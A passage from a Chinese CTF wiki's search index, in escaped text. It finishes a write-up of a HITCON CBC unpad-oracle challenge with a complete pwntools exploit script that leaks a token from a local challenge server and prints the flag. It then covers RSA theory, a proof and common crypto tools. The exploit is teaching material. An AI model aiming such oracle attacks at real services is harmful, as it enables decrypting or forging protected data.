\u52a0\u5bc6\u540e\u7684\u503c\u3002    unpad \u6bcf\u6b21\u4f1a\u5bf9\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u8fdb\u884c unpad\uff0c\u8fd9\u4e2a\u5b57\u8282\u662f\u6839\u636e\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u6765\u51b3\u5b9a\u7684\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u51fa\u8fd9\u4e2a\u5b57\u8282\u7684\u5927\u5c0f\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u80fd\u53ef\u4ee5\u77e5\u9053\u4e00\u4e2a\u5b57\u8282\u7684\u503c\u3002    \u8fd9\u91cc\u6211\u4eec\u6df1\u5165\u5206\u6790\u4e00\u4e0b unpad \u7684\u4fe1\u606f\u6cc4\u6f0f\u3002\u5982\u679c\u6211\u4eec\u5c06\u52a0\u5bc6 IV \u548c  encrypt(md5(token[:i]))  \u653e\u5728\u67d0\u4e2a\u5bc6\u6587 C \u7684\u540e\u9762\uff0c\u6784\u6210  C|IV|encrypt(md5(token[:i])) \uff0c\u90a3\u4e48\u89e3\u5bc6\u51fa\u6765\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u660e\u6587\u5757\u5c31\u662f  md5(token[:i]) \u3002\u8fdb\u800c\uff0c\u5728 unpad \u7684\u65f6\u5019\u5c31\u662f\u5229\u7528  md5(token[:i])  \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff08 0-255\uff09\u8fdb\u884c unpad\uff0c\u4e4b\u540e\u5bf9 unpad \u540e\u7684\u5b57\u7b26\u4e32\u6267\u884c\u6307\u5b9a\u7684\u547d\u4ee4\uff08\u6bd4\u5982md5\uff09\u3002\u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec \u4e8b\u5148\u6784\u9020\u4e00\u4e9b\u6d88\u606f\u54c8\u5e0c\u540e\u52a0\u5bc6\u7684\u6837\u672c \uff0c\u7136\u540e\u5c06\u4e0a\u8ff0\u6267\u884c\u540e\u7684\u7ed3\u679c\u4e0e\u6837\u672c\u6bd4\u8f83\uff0c\u5982\u679c\u76f8\u540c\uff0c\u90a3\u4e48\u6211\u4eec\u57fa\u672c\u53ef\u4ee5\u786e\u5b9a  md5(token[:i])  \u7684 \u6700\u540e\u4e00\u4e2a\u5b57\u8282 \u3002\u7136\u800c\uff0c\u5982\u679c  md5(token[:i])  \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5c0f\u4e8e16\uff0c\u90a3\u4e48\u5728 unpad \u65f6\u5c31\u4f1a\u5229\u7528\u4e00\u4e9b md5 \u4e2d\u7684\u503c\uff0c\u800c\u8fd9\u90e8\u5206\u503c\uff0c\u7531\u4e8e\u5bf9\u4e8e\u4e0d\u540c\u957f\u5ea6\u7684  token[:i]  \u51e0\u4e4e\u90fd\u4e0d\u4f1a\u76f8\u540c\u3002\u6240\u4ee5\u53ef\u80fd\u9700\u8981\u7279\u6b8a\u5904\u7406\u3002  \u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u8fd9\u4e2a\u95ee\u9898\u7684\u5173\u952e\uff0c\u5373\u751f\u6210\u4e0e unpad \u5b57\u8282\u5927\u5c0f\u5bf9\u5e94\u7684\u52a0\u5bc6\u7ed3\u679c\u6837\u672c\uff0c\u4ee5\u4fbf\u4e8e\u67e5\u8868\u3002  \u5177\u4f53\u5229\u7528\u601d\u8def\u5982\u4e0b   \u7ed5\u8fc7 proof of work\u3002  \u83b7\u53d6 token \u52a0\u5bc6\u540e\u7684\u7ed3\u679c  token_enc  \uff0c\u8fd9\u91cc\u4f1a\u5728 token \u524d\u9762\u6dfb\u52a0 7 \u4e2a\u5b57\u8282  token:   \u3002 \u56e0\u6b64\u52a0\u5bc6\u540e\u7684\u957f\u5ea6\u4e3a 64\u3002  \u4f9d\u6b21\u83b7\u53d6  encrypt(md5(token[:i]))  \u7684\u7ed3\u679c\uff0c\u4e00\u5171\u662f 57 \u4e2a\uff0c\u5305\u62ec\u6700\u540e\u4e00\u4e2a token \u7684 padding\u3002  \u6784\u9020\u4e0e unpad \u5927\u5c0f\u5bf9\u5e94\u7684\u6837\u672c\u3002\u8fd9\u91cc\u6211\u4eec\u6784\u9020\u5bc6\u6587  token_enc|padding|IV_indexi|welcome_enc \u3002\u7531\u4e8e  IV_indexi  \u662f\u4e3a\u4e86\u4fee\u6539\u6700\u540e\u4e00\u4e2a\u660e\u6587\u5757\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u8be5\u5b57\u8282\u5904\u4e8e\u53d8\u5316\u4e4b\u4e2d\u3002\u6211\u4eec\u82e5\u60f3\u83b7\u53d6\u4e00\u4e9b\u56fa\u5b9a\u5b57\u8282\u7684\u54c8\u5e0c\u503c\uff0c\u8fd9\u90e8\u5206\u81ea\u7136\u4e0d\u80fd\u6dfb\u52a0\u3002\u56e0\u6b64\u8fd9\u91cc\u4ea7\u751f\u6837\u672c\u65f6 unpad \u7684\u5927\u5c0f\u8303\u56f4\u4e3a 17 ~ 255\u3002\u5982\u679c\u6700\u540e\u6d4b\u8bd5\u65f6  md5(token[:i])  \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5c0f\u4e8e17\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u4f1a\u51fa\u73b0\u4e00\u4e9b\u672a\u77e5\u7684\u6837\u672c\u3002\u5f88\u81ea\u7136\u7684\u4e00\u4e2a\u60f3\u6cd5\u662f\u6211\u4eec\u76f4\u63a5\u83b7\u53d6 255-17+1\u4e2a\u8fd9\u4e48\u591a\u4e2a\u6837\u672c\uff0c\u7136\u800c\uff0c\u5982\u679c\u8fd9\u6837\u505a\u7684\u8bdd\uff0c\u6839\u636e\u4e0a\u9762 340 \u7684\u6b21\u6570\uff08255-17+1+57+56 340\uff09\u9650\u5236\uff0c\u6211\u4eec\u663e\u7136\u4e0d\u80fd\u83b7\u53d6\u5230 token \u7684\u6240\u6709\u5b57\u8282\u3002\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u590d\u7528\u4e00\u4e9b\u5185\u5bb9\uff0c\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u590d\u7528   encrypt(md5(token[:i]))   \u7684\u7ed3\u679c\u3002\u90a3\u4e48\u6211\u4eec\u5728\u8865\u5145 padding \u65f6\u9700\u8981\u786e\u4fdd\u4e00\u65b9\u9762\u6b21\u6570\u591f\u7528\uff0c\u53e6\u4e00\u65b9\u9762\u53ef\u4ee5\u590d\u7528\u4e4b\u524d\u7684\u7ed3\u679c\u3002\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e unpad \u7684\u5faa\u73af\u4e3a 17 \u5230 208\uff0c\u5e76\u4f7f\u5f97 unpad \u5927\u4e8e 208 \u65f6\u6070\u597d unpad \u5230\u6211\u4eec\u53ef\u4ee5\u590d\u7528\u7684\u5730\u65b9\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5f53  md5(token[:i])  \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u4e3a 0 \u65f6\uff0c\u4f1a\u5c06\u6240\u6709\u89e3\u5bc6\u540e\u7684\u660e\u6587 unpad \u6389\uff0c\u56e0\u6b64\u4f1a\u51fa\u73b0 command not found \u7684\u5bc6\u6587\u3002  \u518d\u6b21\u6784\u9020\u5bc6\u6587  token_enc|padding|IV|encrypt(md5(token[:i]))  \uff0c\u90a3\u4e48\uff0c\u89e3\u5bc6\u65f6\u5373\u4f7f\u7528  md5(token[:i])  \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u8fdb\u884c unpad\u3002\u5982\u679c\u8fd9\u4e2a\u5b57\u8282\u4e0d\u5c0f\u4e8e17\u6216\u8005\u4e3a0\uff0c\u5219\u53ef\u4ee5\u5904\u7406\u3002\u5982\u679c\u8fd9\u4e2a\u5b57\u8282\u5c0f\u4e8e17\uff0c\u90a3\u4e48\u663e\u7136\uff0c\u6700\u540e\u8fd4\u56de\u7ed9\u7528\u6237\u7684 md5 \u7684\u7ed3\u679c\u5e76\u4e0d\u5728\u6837\u672c\u8303\u56f4\u5185\uff0c\u90a3\u4e48\u6211\u4eec\u4fee\u6539\u5176\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u6700\u9ad8\u6bd4\u7279\u4f4d\uff0c\u4f7f\u5176 unpad \u540e\u53ef\u4ee5\u843d\u5728\u6837\u672c\u8303\u56f4\u5185\u3002\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u731c\u51fa  md5(token[:i])  \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002  \u5728\u731c\u51fa  md5(token[:i])  \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u672c\u5730\u66b4\u529b\u7834\u89e3 256 \u6b21\uff0c\u627e\u51fa\u6240\u6709\u54c8\u5e0c\u503c\u672b\u5c3e\u4e3a  md5(token[:i])  \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u5b57\u7b26\u3002  \u4f46\u662f\uff0c\u5728\u7b2c\u516d\u6b65\u4e2d\uff0c\u5bf9\u4e8e\u4e00\u4e2a  md5(token[:i])   \u53ef\u80fd\u4f1a\u627e\u51fa\u591a\u4e2a\u5907\u9009\u5b57\u7b26\uff0c\u56e0\u4e3a\u6211\u4eec\u53ea\u9700\u8981\u4f7f\u5f97\u5176\u672b\u5c3e\u5b57\u8282\u662f\u7ed9\u5b9a\u5b57\u8282\u5373\u53ef\u3002  \u90a3\u4e48\uff0c\u95ee\u9898\u6765\u4e86\uff0c\u5982\u4f55\u5220\u9664\u4e00\u4e9b\u591a\u4f59\u7684\u5907\u9009\u5b57\u7b26\u4e32\u5462\uff1f\u8fd9\u91cc\u6211\u5c31\u9009\u62e9\u4e86\u4e00\u4e2a\u5c0f trick\uff0c\u5373\u5728\u9010\u5b57\u8282\u679a\u4e3e\u65f6\uff0c\u540c\u65f6\u679a\u4e3e\u51fa token \u7684 padding\u3002\u7531\u4e8e padding \u662f 0x01 \u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8fc7\u6ee4\u51fa\u6240\u6709\u7ed3\u5c3e\u4e0d\u662f 0x01 \u7684token \u5373\u53ef\u3002   \u8fd9\u91cc\uff0c\u5728\u6d4b\u8bd5\u65f6\uff0c\u5c06\u4ee3\u7801\u4e2d  sleep  \u6ce8\u91ca\u6389\u4e86\u3002\u4ee5\u4fbf\u4e8e\u52a0\u5feb\u4ea4\u4e92\u901f\u5ea6\u3002\u5229\u7528\u4ee3\u7801\u5982\u4e0b  from   pwn   import   *  import   base64 ,   time ,   random ,   string  from   Crypto.Cipher   import   AES  from   Crypto.Hash   import   SHA256 ,   MD5  #context.log_level =  debug  p   =   remote ( 127.0.0.1 ,   7777 )  def   strxor ( str1 ,   str2 ): \n     return   . join ([ chr ( ord ( c1 )   ^   ord ( c2 ))   for   c1 ,   c2   in   zip ( str1 ,   str2 )])  def   pad ( msg ): \n     pad_length   =   16   -   len ( msg )   %   16 \n     return   msg   +   chr ( pad_length )   *   pad_length  def   unpad ( msg ): \n     return   msg [: - ord ( msg [ - 1 ])]    # remove pad  def   flipplain ( oldplain ,   newplain ,   iv ): \n     flip oldplain to new plain, return proper iv \n     return   strxor ( strxor ( oldplain ,   newplain ),   iv )  def   bypassproof (): \n     p . recvuntil ( SHA256(XXXX+ ) \n     lastdata   =   p . recvuntil ( ) ,   drop = True ) \n     p . recvuntil (  ==  ) \n     digest   =   p . recvuntil ( \\n Give me XXXX: ,   drop = True ) \n\n     def   proof ( s ): \n         return   SHA256 . new ( s   +   lastdata ) . hexdigest ()   ==   digest \n\n     data   =   pwnlib . util . iters . mbruteforce ( \n         proof ,   string . ascii_letters   +   string . digits ,   4 ,   method = fixed ) \n     p . sendline ( data )  def   sendmsg ( iv ,   cipher ): \n     payload   =   iv   +   cipher \n     payload   =   base64 . b64encode ( payload ) \n     p . sendline ( payload )  def   recvmsg (): \n     data   =   p . recvuntil ( \\n ,   drop = True ) \n     data   =   base64 . b64decode ( data ) \n     return   data [: 16 ],   data [ 16 :]  def   getmd5enc ( i ,   cipher_token ,   cipher_welcome ,   iv ): \n     return encrypt( md5( token[:i+1] ) ) \n     ## keep iv[7:] do not change, so decrypt msg[7:] won t change \n     get_md5_iv   =   flipplain ( token:  . ljust ( 16 ,   \\x00 ),   get-md5 . ljust ( \n         16 ,   \\x00 ),   iv ) \n     payload   =   cipher_token \n     ## calculate the proper last byte number \n     last_byte_iv   =   flipplain ( \n         pad ( Welcome!! ), \n         a   *   15   +   chr ( len ( cipher_token )   +   16   +   16   -   ( 7   +   i   +   1 )),   iv ) \n     payload   +=   last_byte_iv   +   cipher_welcome \n     sendmsg ( get_md5_iv ,   payload ) \n     return   recvmsg ()  def   get_md5_token_indexi ( iv_encrypt ,   cipher_welcome ,   cipher_token ): \n     md5_token_idxi   =   [] \n     for   i   in   range ( len ( cipher_token )   -   7 ): \n         log . info ( idx i: {} . format ( i )) \n         _ ,   md5_indexi   =   getmd5enc ( i ,   cipher_token ,   cipher_welcome ,   iv_encrypt ) \n         assert   ( len ( md5_indexi )   ==   32 ) \n         # remove the last 16 byte for padding \n         md5_token_idxi . append ( md5_indexi [: 16 ]) \n     return   md5_token_idxi  def   doin ( unpadcipher ,   md5map ,   candidates ,   flag ): \n     if   unpadcipher   in   md5map : \n         lastbyte   =   md5map [ unpadcipher ] \n     else : \n         lastbyte   =   0 \n     if   flag   ==   0 : \n         lastbyte   ^=   0x80 \n     newcandidates   =   [] \n     for   x   in   candidates : \n         for   c   in   range ( 256 ): \n             if   MD5 . new ( x   +   chr ( c )) . digest ()[ - 1 ]   ==   chr ( lastbyte ): \n                 newcandidates . append ( x   +   chr ( c )) \n     candidates   =   newcandidates \n     print   candidates \n     return   candidates  def   main (): \n     bypassproof () \n\n     # result of encrypted Welcome!! \n     iv_encrypt ,   cipher_welcome   =   recvmsg () \n     log . info ( cipher welcome is :    +   cipher_welcome ) \n\n     # execute get-token \n     get_token_iv   =   flipplain ( pad ( Welcome!! ),   pad ( get-token ),   iv_encrypt ) \n     sendmsg ( get_token_iv ,   cipher_welcome ) \n     _ ,   cipher_token   =   recvmsg () \n     token_len   =   len ( cipher_token ) \n     log . info ( cipher token is :    +   cipher_token ) \n\n     # get command not found cipher \n     sendmsg ( iv_encrypt ,   cipher_welcome ) \n     _ ,   cipher_notfound   =   recvmsg () \n\n     # get encrypted(token[:i+1]),57 times \n     md5_token_idx_list   =   get_md5_token_indexi ( iv_encrypt ,   cipher_welcome , \n                                               cipher_token ) \n     # get md5map for each unpadsize, 209-17 times \n     # when upadsize 208, it will unpad ciphertoken \n     # then we can reuse \n     md5map   =   dict () \n     for   unpadsize   in   range ( 17 ,   209 ): \n         log . info ( get unpad size {} cipher . format ( unpadsize )) \n         get_md5_iv   =   flipplain ( token:  . ljust ( 16 ,   \\x00 ),   get-md5 . ljust ( \n             16 ,   \\x00 ),   iv_encrypt ) \n         ## padding 16*11 bytes \n         padding   =   16   *   11   *   a \n         ## calculate the proper last byte number, only change the last byte \n         ## set last_byte_iv = iv_encrypted[:15] | proper byte \n         last_byte_iv   =   flipplain ( \n             pad ( Welcome!! ), \n             pad ( Welcome!! )[: 15 ]   +   chr ( unpadsize ),   iv_encrypt ) \n         cipher   =   cipher_token   +   padding   +   last_byte_iv   +   cipher_welcome \n         sendmsg ( get_md5_iv ,   cipher ) \n         _ ,   unpadcipher   =   recvmsg () \n         md5map [ unpadcipher ]   =   unpadsize \n\n     # reuse encrypted(token[:i+1]) \n     for   i   in   range ( 209 ,   256 ): \n         target   =   md5_token_idx_list [ 56   -   ( i   -   209 )] \n         md5map [ target ]   =   i \n\n     candidates   =   [ ] \n     # get the byte token[i], only 56 byte \n     for   i   in   range ( token_len   -   7 ): \n         log . info ( get token[{}] . format ( i )) \n         get_md5_iv   =   flipplain ( token:  . ljust ( 16 ,   \\x00 ),   get-md5 . ljust ( \n             16 ,   \\x00 ),   iv_encrypt ) \n         ## padding 16*11 bytes \n         padding   =   16   *   11   *   a \n         cipher   =   cipher_token   +   padding   +   iv_encrypt   +   md5_token_idx_list [ i ] \n         sendmsg ( get_md5_iv ,   cipher ) \n         _ ,   unpadcipher   =   recvmsg () \n         # already in or md5[token[:i]][-1]= \\x00 \n         if   unpadcipher   in   md5map   or   unpadcipher   ==   cipher_notfound : \n             candidates   =   doin ( unpadcipher ,   md5map ,   candidates ,   1 ) \n         else : \n             log . info ( unpad size 1-16 ) \n             # flip most significant bit of last byte to move it in a good range \n             cipher   =   cipher [: - 17 ]   +   strxor ( cipher [ - 17 ],   \\x80 )   +   cipher [ - 16 :] \n             sendmsg ( get_md5_iv ,   cipher ) \n             _ ,   unpadcipher   =   recvmsg () \n             if   unpadcipher   in   md5map   or   unpadcipher   ==   cipher_notfound : \n                 candidates   =   doin ( unpadcipher ,   md5map ,   candidates ,   0 ) \n             else : \n                 log . info ( oh my god,,,, it must be in... ) \n                 exit () \n     print   len ( candidates ) \n     # padding 0x01 \n     candidates   =   filter ( lambda   x :   x [ - 1 ]   ==   chr ( 0x01 ),   candidates ) \n     # only 56 bytes \n     candidates   =   [ x [: - 1 ]   for   x   in   candidates ] \n     print   len ( candidates ) \n     assert   ( len ( candidates [ 0 ])   ==   56 ) \n\n     # check-token \n     check_token_iv   =   flipplain ( \n         pad ( Welcome!! ),   pad ( check-token ),   iv_encrypt ) \n     sendmsg ( check_token_iv ,   cipher_welcome ) \n     p . recvuntil ( Give me the token! \\n ) \n     p . sendline ( base64 . b64encode ( candidates [ 0 ])) \n     print   p . recv () \n\n     p . interactive ()  if   __name__   ==   __main__ : \n     main ()   \u6548\u679c\u5982\u4e0b  ... 79  1 \nhitcon { uNp@d_M3th0D_i5_am4Z1n9! }", 
            "title": "\u5229\u7528\u601d\u8def"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_30", 
            "text": "\u5206\u7ec4\u52a0\u5bc6\u6a21\u5f0f    https://en.wikipedia.org/wiki/Padding_oracle_attack  http://netifera.com/research/poet/PaddingOraclesEverywhereEkoparty2010.pdf  https://ctftime.org/writeup/7975  https://ctftime.org/writeup/7974", 
            "title": "\u53c2\u8003\u94fe\u63a5"
        }, 
        {
            "location": "/crypto/asymmetric/introduction/", 
            "text": "\u5728\u975e\u5bf9\u79f0\u5bc6\u7801\u4e2d\uff0c\u52a0\u5bc6\u8005\u4e0e\u89e3\u5bc6\u8005\u6240\u4f7f\u7528\u7684\u5bc6\u94a5\u5e76\u4e0d\u4e00\u6837\uff0c\u5178\u578b\u7684\u6709 RSA \u52a0\u5bc6\uff0c\u80cc\u5305\u52a0\u5bc6\uff0c\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u3002", 
            "title": "\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b80\u4ecb"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_theory/", 
            "text": "RSA \u52a0\u5bc6\u7b97\u6cd5\u662f\u4e00\u79cd\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u3002\u5728\u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6\u548c\u7535\u5b50\u5546\u4e1a\u4e2d RSA \u88ab\u5e7f\u6cdb\u4f7f\u7528\u3002RSA \u662f 1977 \u5e74\u7531\u7f57\u7eb3\u5fb7\u00b7\u674e\u7ef4\u65af\u7279\uff08Ron Rivest\uff09\u3001\u963f\u8fea\u00b7\u8428\u83ab\u5c14\uff08Adi Shamir\uff09\u548c\u4f26\u7eb3\u5fb7\u00b7\u963f\u5fb7\u66fc\uff08Leonard Adleman\uff09\u4e00\u8d77\u63d0\u51fa\u7684\u3002RSA \u5c31\u662f\u4ed6\u4eec\u4e09\u4eba\u59d3\u6c0f\u5f00\u5934\u5b57\u6bcd\u62fc\u5728\u4e00\u8d77\u7ec4\u6210\u7684\u3002\n\n\nRSA \u7b97\u6cd5\u7684\u53ef\u9760\u6027\u7531\u6781\u5927\u6574\u6570\u56e0\u6570\u5206\u89e3\u7684\u96be\u5ea6\u51b3\u5b9a\u3002\u6362\u8a00\u4e4b\uff0c\u5bf9\u4e00\u6781\u5927\u6574\u6570\u505a\u56e0\u6570\u5206\u89e3\u6108\u56f0\u96be\uff0cRSA \u7b97\u6cd5\u6108\u53ef\u9760\u3002\u5047\u5982\u6709\u4eba\u627e\u5230\u4e00\u79cd\u5feb\u901f\u56e0\u6570\u5206\u89e3\u7684\u7b97\u6cd5\u7684\u8bdd\uff0c\u90a3\u4e48\u7528 RSA \u52a0\u5bc6\u7684\u4fe1\u606f\u7684\u53ef\u9760\u6027\u5c31\u80af\u5b9a\u4f1a\u6781\u5ea6\u4e0b\u964d\u3002\u4f46\u627e\u5230\u8fd9\u6837\u7684\u7b97\u6cd5\u7684\u53ef\u80fd\u6027\u662f\u975e\u5e38\u5c0f\u7684\u3002\u5982\u4eca\uff0c\u53ea\u6709\u77ed\u7684 RSA \u5bc6\u94a5\u624d\u53ef\u80fd\u88ab\u5f3a\u529b\u65b9\u5f0f\u89e3\u7834\u3002\u5230 2017 \u5e74\u4e3a\u6b62\uff0c\u8fd8\u6ca1\u6709\u4efb\u4f55\u53ef\u9760\u7684\u653b\u51fb RSA \u7b97\u6cd5\u7684\u65b9\u5f0f\u3002\n\n\n\u57fa\u672c\u539f\u7406\n\n\n\u516c\u94a5\u4e0e\u79c1\u94a5\u7684\u4ea7\u751f\n\n\n\n\n\u968f\u673a\u9009\u62e9\u4e24\u4e2a\u4e0d\u540c\u5927\u8d28\u6570 \np\np\n \u548c \nq\nq\n\uff0c\u8ba1\u7b97 \nN = p \\times q\nN = p \\times q\n\n\n\u6839\u636e\u6b27\u62c9\u51fd\u6570\uff0c\u6c42\u5f97 \nr=\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1)\nr=\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1)\n\n\n\u9009\u62e9\u4e00\u4e2a\u5c0f\u4e8e \nr\nr\n \u7684\u6574\u6570 \ne\ne\n\uff0c\u4f7f \ne\ne\n \u548c \nr\nr\n \u4e92\u8d28\u3002\u5e76\u6c42\u5f97 \ne\ne\n \u5173\u4e8e \nr\nr\n \u7684\u6a21\u53cd\u5143\u7d20\uff0c\u547d\u540d\u4e3a \nd\nd\n\uff0c\u6709 \ned\\equiv 1 \\pmod r\ned\\equiv 1 \\pmod r\n\n\n\u5c06 \np\np\n \u548c \nq\nq\n \u7684\u8bb0\u5f55\u9500\u6bc1\n\n\n\n\n\u6b64\u65f6\uff0c\n(N,e)\n(N,e)\n \u662f\u516c\u94a5\uff0c\n(N,d)\n(N,d)\n \u662f\u79c1\u94a5\u3002\n\n\n\u6d88\u606f\u52a0\u5bc6\n\n\n\u9996\u5148\u9700\u8981\u5c06\u6d88\u606f \nm\nm\n \u4ee5\u4e00\u4e2a\u53cc\u65b9\u7ea6\u5b9a\u597d\u7684\u683c\u5f0f\u8f6c\u5316\u4e3a\u4e00\u4e2a\u5c0f\u4e8e \nN\nN\n\uff0c\u4e14\u4e0e \nN\nN\n \u4e92\u8d28\u7684\u6574\u6570 \nn\nn\n\u3002\u5982\u679c\u6d88\u606f\u592a\u957f\uff0c\u53ef\u4ee5\u5c06\u6d88\u606f\u5206\u4e3a\u51e0\u6bb5\uff0c\u8fd9\u4e5f\u5c31\u662f\u6211\u4eec\u6240\u8bf4\u7684\u5757\u52a0\u5bc6\uff0c\u540e\u5bf9\u4e8e\u6bcf\u4e00\u90e8\u5206\u5229\u7528\u5982\u4e0b\u516c\u5f0f\u52a0\u5bc6\uff1a\n\n\n\n\n\nn^{e}\\equiv c\\pmod N\n\n\n\n\nn^{e}\\equiv c\\pmod N\n\n\n\n\n\n\u6d88\u606f\u89e3\u5bc6\n\n\n\u5229\u7528\u5bc6\u94a5 \nd\nd\n \u8fdb\u884c\u89e3\u5bc6\u3002\n\n\n\n\n\nc^{d}\\equiv n\\pmod N\n\n\n\n\nc^{d}\\equiv n\\pmod N\n\n\n\n\n\n\u6b63\u786e\u6027\u8bc1\u660e\n\n\n\u5373\u6211\u4eec\u8981\u8bc1\nn^{ed} \\equiv n \\bmod N\nn^{ed} \\equiv n \\bmod N\n\uff0c\u5df2\u77e5\ned \\equiv 1 \\bmod \\phi(N)\ned \\equiv 1 \\bmod \\phi(N)\n\uff0c\u90a3\u4e48 \ned=k\\phi(N)+1\ned=k\\phi(N)+1\n\uff0c\u5373\u9700\u8981\u8bc1\u660e\n\n\n\n\n\nn^{k\\phi(N)+1}  \\equiv n \\bmod N\n\n\n\n\nn^{k\\phi(N)+1}  \\equiv n \\bmod N\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u5206\u4e24\u79cd\u60c5\u51b5\u8bc1\u660e\n\n\n\u7b2c\u4e00\u79cd\u60c5\u51b5 \ngcd(n,N)=1\ngcd(n,N)=1\n\uff0c\u90a3\u4e48 \nn^{\\phi(N)} \\equiv 1 \\bmod N\nn^{\\phi(N)} \\equiv 1 \\bmod N\n\uff0c\u56e0\u6b64\u539f\u5f0f\u6210\u7acb\u3002\n\n\n\u7b2c\u4e8c\u79cd\u60c5\u51b5 \ngcd(n,N)!=1\ngcd(n,N)!=1\n\uff0c\u90a3\u4e48 n \u5fc5\u7136\u662f p \u6216\u8005 q \u7684\u500d\u6570\uff0c\u5e76\u4e14 n \u5c0f\u4e8e N\u3002\u6211\u4eec\u5047\u8bbe\n\n\n\n\n\nn=xp\n\n\n\n\nn=xp\n\n\n\n\n\n\u90a3\u4e48 x \u5fc5\u7136\u5c0f\u4e8e q\uff0c\u53c8\u7531\u4e8e q \u662f\u7d20\u6570\u3002\u90a3\u4e48\n\n\n\n\n\nn^{\\phi(q)} \\equiv 1 \\bmod q\n\n\n\n\nn^{\\phi(q)} \\equiv 1 \\bmod q\n\n\n\n\n\n\u8fdb\u800c\n\n\n\n\n\nn^{k\\phi(N)}=n^{k(p-1)(q-1)}=(n^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q\n\n\n\n\nn^{k\\phi(N)}=n^{k(p-1)(q-1)}=(n^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q\n\n\n\n\n\n\u90a3\u4e48\n\n\n\n\n\nn^{k\\phi(N)+1}=n+uqn\n\n\n\n\nn^{k\\phi(N)+1}=n+uqn\n\n\n\n\n\n\u8fdb\u800c\n\n\n\n\n\nn^{k\\phi(N)+1}=n+uqxp=n+uxN\n\n\n\n\nn^{k\\phi(N)+1}=n+uqxp=n+uxN\n\n\n\n\n\n\u6240\u4ee5\u539f\u5f0f\u6210\u7acb\u3002\n\n\n\u57fa\u672c\u5de5\u5177\n\n\nRSAtool\n\n\n\n\n\n\n\u5b89\u88c5\n\n\ngit clone https://github.com/ius/rsatool.git\n\ncd\n rsatool\npython rsatool.py -h\n\n\n\n\n\n\n\n\n\u751f\u6210\u79c1\u94a5\n\n\npython rsatool.py -f PEM -o private.pem -p \n1234567\n -q \n7654321\n\n\n\n\n\n\n\n\n\nRSA Converter\n\n\n\n\n\u6839\u636e\u7ed9\u5b9a\u5bc6\u94a5\u5bf9\uff0c\u751f\u6210 pem \u6587\u4ef6\n\n\n\u6839\u636e n\uff0ce\uff0cd \u5f97\u51fa p\uff0cq\n\n\n\n\nopenssl\n\n\n\n\n\n\n\u67e5\u770b\u516c\u94a5\u6587\u4ef6\n\n\nopenssl rsa -pubin -in pubkey.pem -text -modulus\n\n\n\n\n\n\n\n\n\u89e3\u5bc6\n\n\nrsautl -decrypt -inkey private.pem -in flag.enc -out flag\n\n\n\n\n\n\n\n\n\u66f4\u52a0\u5177\u4f53\u7684\u7ec6\u8282\u8bf7\u53c2\u8003 \nopenssl --help\n\u3002\n\n\n\u5206\u89e3\u6574\u6570\u5de5\u5177\n\n\n\n\n\u7f51\u7ad9\u5206\u89e3\uff0c\nfactor.db\n\n\n\u547d\u4ee4\u884c\u5206\u89e3\uff0c\nfactordb-pycli\n\uff0c\u501f\u7528 factordb \u6570\u636e\u5e93\u3002\n\n\nyafu\n\n\n\n\npython \u5e93\n\n\nprimefac\n\n\n\u6574\u6570\u5206\u89e3\u5e93\uff0c\u5305\u542b\u4e86\u5f88\u591a\u6574\u6570\u5206\u89e3\u7684\u7b97\u6cd5\u3002\n\n\ngmpy\n\n\n\n\ngmpy.root(a, b)\n\uff0c\u8fd4\u56de\u4e00\u4e2a\u5143\u7ec4 \n(x, y)\n\uff0c\u5176\u4e2d \nx\n \u4e3a \na\n \u5f00 \nb\n \u6b21\u65b9\u7684\u503c\uff0c\ny\n \u662f\u5224\u65ad \nx\n \u662f\u5426\u4e3a\u6574\u6570\u7684\u5e03\u5c14\u578b\u53d8\u91cf\n\n\n\n\ngmpy2\n\n\n\u5b89\u88c5\u65f6\uff0c\u53ef\u80fd\u4f1a\u9700\u8981\u81ea\u5df1\u53e6\u884c\u5b89\u88c5 mfpr \u4e0e mpc \u5e93\u3002\n\n\n\n\ngmpy2.iroot(a, b)\n\uff0c\u7c7b\u4f3c\u4e8e \ngmpy.root(a,b)\n\n\n\n\npycrypto\n\n\n\n\n\n\n\u5b89\u88c5\n\n\nsudo pip install pycrypto\n\n\n\n\n\n\n\n\n\u4f7f\u7528\n\n\nimport\n \ngmpy\n\n\nfrom\n \nCrypto.Util.number\n \nimport\n \n*\n\n\nfrom\n 